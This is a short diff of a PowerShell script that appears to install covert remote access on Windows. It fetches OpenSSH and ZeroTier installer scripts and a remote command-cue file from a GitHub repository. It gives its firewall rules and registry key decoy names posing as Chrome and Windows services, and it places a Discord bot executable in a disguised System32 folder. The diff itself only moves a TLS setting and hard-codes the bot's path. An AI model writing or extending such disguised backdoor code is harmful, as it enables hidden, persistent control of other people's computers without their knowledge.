@@ -12,6 +12,8 @@ $ssholdfirewall = "Google Chrome Core Service"
 $ztprogramname = "ZeroTier One"
 $sshprogramname = "OpenSSH"
 $sshfirewall = "Windows Runtime Broker"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
 $ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZeroTierStuff/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
@@ -21,14 +23,11 @@ $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
+$programDataPath = $env:ProgramData
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$programDataPath = $env:ProgramData
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
-$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\DiscordStatusUpdateBot.exe"
 #File Integrity Check.
 if (-not (Test-Path (Split-Path $botpath))) {
     New-Item -Path (Split-Path $botpath) -ItemType Directory -Force
